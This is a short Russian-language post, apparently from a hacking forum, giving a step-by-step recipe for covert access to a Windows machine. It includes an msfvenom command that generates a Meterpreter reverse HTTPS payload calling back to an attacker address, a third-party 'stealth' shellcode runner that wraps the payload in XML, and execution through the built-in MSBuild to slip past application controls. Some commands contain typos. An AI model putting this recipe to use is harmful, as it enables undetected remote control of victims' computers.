Эта методика позволяет обойти некоторую защиту и оставаться в системе более менее без палева, напишу шаги для реализации:

1) Генерируем полезную нагрузку через фреймфорк: 

msfvenom -p windows/×64/meterpreter/reverse_https LOST=192.168.49.122 LPORT=443 -f raw -o meter.bin
2) Клонируем себе репу: https://github.com/kymb0/Stealth_shellcode_runners и запускаем генерацию xml файлика:

generator.py meter.bin
3) Запускаем встроенный майками билдер на атакуемом хосте 

C: \Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe